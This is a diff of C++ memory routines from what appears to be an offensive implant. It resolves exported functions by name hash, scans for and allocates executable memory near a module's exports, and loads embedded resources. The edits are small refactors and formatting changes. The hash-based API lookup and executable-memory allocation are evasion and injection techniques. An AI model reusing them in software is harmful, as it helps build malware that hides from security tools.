@@ -215,13 +215,13 @@ namespace Memory {
             auto Fns = RVA(PULONG, Base, (long) Exports->AddressOfFunctions);
             auto Names = RVA(PULONG, Base, (long) Exports->AddressOfNames);
 
-            for (ULONG i = 0; i < Exports->NumberOfNames; i++) {
+            for (auto i = 0; i < Exports->NumberOfNames; i++) {
                 auto Name = RVA(LPSTR, Base, (long) Names[i]);
 
                 x_memset(mbsName, 0, MAX_PATH);
 
-                for (auto i = 0; i < x_strlen(Name); i++) {
-                    mbsName[i] = x_toLowerA(Name[i]);
+                for (auto j = 0; j < x_strlen(Name); j++) {
+                    mbsName[j] = x_toLowerA(Name[j]);
                 }
 
                 if (Hash - Utils::GetHashFromStringA(mbsName, x_strlen(Name)) == 0) {
@@ -240,7 +240,7 @@ namespace Memory {
         for (Region = (Export & 0xFFFFFFFFFFF70000) - 0x70000000;
              Region < Export + 0x70000000;
              Region += 0x10000) {
-            if ((Ctx->Nt.NtAllocateVirtualMemory(Proc, REINTC(LPVOID*, &Region), 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ)) >= 0) {
+            if ((Ctx->Nt.NtAllocateVirtualMemory(Proc, RCAST(LPVOID*, &Region), 0, &Size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ)) >= 0) {
                 return Region;
             }
         }
@@ -249,8 +249,8 @@ namespace Memory {
     }
 
     UINT_PTR LdrGetExport(PBYTE Module, PBYTE Export) {
-
         HEXANE
+
         UINT_PTR pExport = 0;
         INT reload = 0;
 
@@ -272,16 +272,16 @@ namespace Memory {
 
     ORSRC LdrGetIntResource(HMODULE Base, INT RsrcId) {
         HEXANE
-        HRSRC hResInfo = {};
-        ORSRC Object = {};
+        HRSRC hResInfo  = { };
+        ORSRC Object    = { };
 
         Object = (ORSRC)Ctx->Nt.RtlAllocateHeap(LocalHeap, 0, sizeof(RSRC));
 
         if (
-            !(hResInfo = Ctx->win32.FindResourceA(Base, MAKEINTRESOURCE(RsrcId), RT_RCDATA)) ||
-            !(Object->hGlobal = Ctx->win32.LoadResource(Base, hResInfo)) ||
-            !(Object->Size = Ctx->win32.SizeofResource(Base, hResInfo)) ||
-            !(Object->ResLock = Ctx->win32.LockResource(Object->hGlobal))) {
+            !(hResInfo          = Ctx->win32.FindResourceA(Base, MAKEINTRESOURCE(RsrcId), RT_RCDATA)) ||
+            !(Object->hGlobal   = Ctx->win32.LoadResource(Base, hResInfo)) ||
+            !(Object->Size      = Ctx->win32.SizeofResource(Base, hResInfo)) ||
+            !(Object->ResLock   = Ctx->win32.LockResource(Object->hGlobal))) {
             Ctx->Nt.RtlFreeHeap(LocalHeap, 0, Object);
             return nullptr;
         }
